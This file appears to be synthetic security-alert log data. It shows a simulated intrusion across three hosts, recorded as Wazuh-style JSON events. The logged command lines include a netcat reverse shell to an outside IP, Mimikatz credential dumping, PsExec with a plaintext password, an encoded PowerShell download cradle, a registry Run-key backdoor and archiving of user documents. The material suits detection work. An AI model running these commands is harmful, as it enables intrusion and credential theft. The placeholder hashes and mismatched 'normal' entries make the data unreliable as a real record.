{"rule": {"level": 15, "description": "Reverse shell detected - netcat execution", "id": "100102", "groups": ["reverse_shell", "c2", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "nc.exe -e cmd.exe 45.67.89.123 4444", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=E2A24AB94F865CAD87470B4583E59BAD6E3E49A8B34C6A420B9F368FA23E98E1"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:36:45+0000"}
{"rule": {"level": 15, "description": "Mimikatz credential dumping detected", "id": "100103", "groups": ["credential_access", "mimikatz", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\mimikatz.exe", "processId": "9003", "parentProcessId": "9002", "parentImage": "C:\\Temp\\nc.exe", "commandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=A1B2C3D4E5F6789012345678901234567890ABCDEF1234567890ABCDEF123456"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:36:48+0000"}
{"rule": {"level": 12, "description": "Lateral movement detected - PsExec", "id": "100104", "groups": ["lateral_movement", "remote_access", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\PsExec.exe", "processId": "9004", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe", "user": "WebServer-01\\Administrator", "destinationIp": "192.168.1.101", "destinationPort": "445"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:36:51+0000"}
{"rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9005", "parentProcessId": "9004", "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:36:54+0000"}
{"rule": {"level": 10, "description": "Critical system file modified", "id": "550", "groups": ["syscheck", "persistence", "file_integrity"]}, "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.102"}, "syscheck": {"path": "/etc/passwd", "event": "modified", "sha256_after": "abc123def456789modified", "md5_after": "def456789abc123", "size_after": 2048, "uname_after": "root", "perm_after": "rw-r--r--"}, "timestamp": "2026-01-12T14:36:57+0000"}
{"rule": {"level": 10, "description": "Registry Run key modified for persistence", "id": "100106", "groups": ["persistence", "registry", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\reg.exe", "processId": "9106", "parentProcessId": "9001", "commandLine": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:03+0000"}
{"rule": {"level": 10, "description": "Suspicious network connection to known C2 server", "id": "100108", "groups": ["c2", "command_and_control", "network"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "sourceIp": "192.168.1.100", "sourcePort": "64900", "destinationIp": "45.67.89.123", "destinationPort": "4444", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:06+0000"}
{"rule": {"level": 15, "description": "Mimikatz credential dumping detected", "id": "100103", "groups": ["credential_access", "mimikatz", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\mimikatz.exe", "processId": "9003", "parentProcessId": "9002", "parentImage": "C:\\Temp\\nc.exe", "commandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=A1B2C3D4E5F6789012345678901234567890ABCDEF1234567890ABCDEF123456"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:09+0000"}
{"rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]}, "agent": {"id": "002", "name": "linux-server", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\explorer.exe", "processId": "1537", "parentProcessId": "706", "commandLine": "svchost.exe -k netsvcs", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:12+0000"}
{"rule": {"level": 15, "description": "WebShell detected - suspicious web process spawning cmd", "id": "100101", "groups": ["webshell", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\cmd.exe", "processId": "9001", "parentProcessId": "8888", "parentImage": "C:\\inetpub\\wwwroot\\w3wp.exe", "commandLine": "cmd.exe /c whoami", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=D9BE711BE2BF88096BB91C25DF775D90B964264AB25EC49CF04711D8C1F089F6"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:15+0000"}
{"rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]}, "agent": {"id": "002", "name": "WebServer-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\explorer.exe", "processId": "4766", "parentProcessId": "581", "commandLine": "svchost.exe -k netsvcs", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:37:18+0000"}
{"rule": {"level": 15, "description": "Mimikatz credential dumping detected", "id": "100103", "groups": ["credential_access", "mimikatz", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\mimikatz.exe", "processId": "9003", "parentProcessId": "9002", "parentImage": "C:\\Temp\\nc.exe", "commandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=A1B2C3D4E5F6789012345678901234567890ABCDEF1234567890ABCDEF123456"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:21+0000"}
{"rule": {"level": 8, "description": "Suspicious data compression activity", "id": "100109", "groups": ["collection", "exfiltration"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\tar.exe", "processId": "9285", "parentProcessId": "9005", "commandLine": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:37:24+0000"}
{"rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9005", "parentProcessId": "9004", "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:37:27+0000"}
{"rule": {"level": 10, "description": "Critical system file modified", "id": "550", "groups": ["syscheck", "persistence", "file_integrity"]}, "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.102"}, "syscheck": {"path": "/etc/passwd", "event": "modified", "sha256_after": "abc123def456789modified", "md5_after": "def456789abc123", "size_after": 2048, "uname_after": "root", "perm_after": "rw-r--r--"}, "timestamp": "2026-01-12T14:37:30+0000"}
{"rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]}, "agent": {"id": "003", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Program Files\\Google\\Chrome\\chrome.exe", "processId": "2928", "parentProcessId": "567", "commandLine": "chrome.exe", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:37:36+0000"}
{"rule": {"level": 10, "description": "Suspicious network connection to known C2 server", "id": "100108", "groups": ["c2", "command_and_control", "network"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "sourceIp": "192.168.1.100", "sourcePort": "51970", "destinationIp": "45.67.89.123", "destinationPort": "4444", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:39+0000"}
{"rule": {"level": 8, "description": "Suspicious data compression activity", "id": "100109", "groups": ["collection", "exfiltration"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\tar.exe", "processId": "9253", "parentProcessId": "9005", "commandLine": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:37:42+0000"}
{"rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]}, "agent": {"id": "002", "name": "WebServer-01", "ip": "192.168.1.102"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\svchost.exe", "processId": "5563", "parentProcessId": "858", "commandLine": "explorer.exe", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T14:37:45+0000"}
{"rule": {"level": 10, "description": "Registry Run key modified for persistence", "id": "100106", "groups": ["persistence", "registry", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\reg.exe", "processId": "9152", "parentProcessId": "9001", "commandLine": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:51+0000"}
{"rule": {"level": 15, "description": "Reverse shell detected - netcat execution", "id": "100102", "groups": ["reverse_shell", "c2", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "nc.exe -e cmd.exe 45.67.89.123 4444", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=E2A24AB94F865CAD87470B4583E59BAD6E3E49A8B34C6A420B9F368FA23E98E1"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T14:37:54+0000"}
{"rule": {"level": 15, "description": "Reverse shell detected - netcat execution", "id": "100102", "groups": ["reverse_shell", "c2", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "nc.exe -e cmd.exe 45.67.89.123 4444", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=E2A24AB94F865CAD87470B4583E59BAD6E3E49A8B34C6A420B9F368FA23E98E1"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:02:38+0000"}
{"rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9005", "parentProcessId": "9004", "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T15:02:41+0000"}
{"rule": {"level": 12, "description": "Lateral movement detected - PsExec", "id": "100104", "groups": ["lateral_movement", "remote_access", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\PsExec.exe", "processId": "9004", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe", "user": "WebServer-01\\Administrator", "destinationIp": "192.168.1.101", "destinationPort": "445"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:02:44+0000"}
{"rule": {"level": 12, "description": "PowerShell encoded command execution", "id": "100105", "groups": ["powershell", "execution", "attack"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "processId": "9005", "parentProcessId": "9004", "commandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4ANgA3AC4AOAA5AC4AMQAyADMALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T15:02:47+0000"}
{"rule": {"level": 10, "description": "Critical system file modified", "id": "550", "groups": ["syscheck", "persistence", "file_integrity"]}, "agent": {"id": "003", "name": "linux-server", "ip": "192.168.1.102"}, "syscheck": {"path": "/etc/passwd", "event": "modified", "sha256_after": "abc123def456789modified", "md5_after": "def456789abc123", "size_after": 2048, "uname_after": "root", "perm_after": "rw-r--r--"}, "timestamp": "2026-01-12T15:02:50+0000"}
{"rule": {"level": 10, "description": "Registry Run key modified for persistence", "id": "100106", "groups": ["persistence", "registry", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\reg.exe", "processId": "9191", "parentProcessId": "9001", "commandLine": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\Temp\\backdoor.exe", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:02:53+0000"}
{"rule": {"level": 10, "description": "Suspicious network connection to known C2 server", "id": "100108", "groups": ["c2", "command_and_control", "network"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\nc.exe", "processId": "9002", "sourceIp": "192.168.1.100", "sourcePort": "61467", "destinationIp": "45.67.89.123", "destinationPort": "4444", "protocol": "tcp"}, "system": {"eventID": "3", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:02:59+0000"}
{"rule": {"level": 8, "description": "Suspicious data compression activity", "id": "100109", "groups": ["collection", "exfiltration"]}, "agent": {"id": "002", "name": "victim-01", "ip": "192.168.1.101"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\System32\\tar.exe", "processId": "9241", "parentProcessId": "9005", "commandLine": "tar.exe -czf C:\\Temp\\data.tar.gz C:\\Users\\*\\Documents", "user": "victim-01\\admin"}, "system": {"eventID": "1", "computer": "victim-01"}}}, "timestamp": "2026-01-12T15:03:02+0000"}
{"rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]}, "agent": {"id": "001", "name": "linux-server", "ip": "192.168.1.102"}, "data": {"win": {"eventdata": {"image": "C:\\Program Files\\Google\\Chrome\\chrome.exe", "processId": "7312", "parentProcessId": "908", "commandLine": "svchost.exe -k netsvcs", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:03:05+0000"}
{"rule": {"level": 3, "description": "Normal system activity", "id": "100110", "groups": ["normal"]}, "agent": {"id": "001", "name": "victim-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\explorer.exe", "processId": "2583", "parentProcessId": "525", "commandLine": "svchost.exe -k netsvcs", "user": "NT AUTHORITY\\SYSTEM"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:03:08+0000"}
{"rule": {"level": 12, "description": "Lateral movement detected - PsExec", "id": "100104", "groups": ["lateral_movement", "remote_access", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\PsExec.exe", "processId": "9004", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe", "user": "WebServer-01\\Administrator", "destinationIp": "192.168.1.101", "destinationPort": "445"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:03:11+0000"}
{"rule": {"level": 15, "description": "Mimikatz credential dumping detected", "id": "100103", "groups": ["credential_access", "mimikatz", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Temp\\mimikatz.exe", "processId": "9003", "parentProcessId": "9002", "parentImage": "C:\\Temp\\nc.exe", "commandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords", "user": "NT AUTHORITY\\SYSTEM", "hashes": "SHA256=A1B2C3D4E5F6789012345678901234567890ABCDEF1234567890ABCDEF123456"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:03:14+0000"}
{"rule": {"level": 12, "description": "Lateral movement detected - PsExec", "id": "100104", "groups": ["lateral_movement", "remote_access", "attack"]}, "agent": {"id": "001", "name": "WebServer-01", "ip": "192.168.1.100"}, "data": {"win": {"eventdata": {"image": "C:\\Windows\\PsExec.exe", "processId": "9004", "parentProcessId": "9001", "parentImage": "C:\\Windows\\System32\\cmd.exe", "commandLine": "psexec.exe \\\\192.168.1.101 -u admin -p P@ssw0rd cmd.exe", "user": "WebServer-01\\Administrator", "destinationIp": "192.168.1.101", "destinationPort": "445"}, "system": {"eventID": "1", "computer": "WebServer-01"}}}, "timestamp": "2026-01-12T15:03:17+0000"}
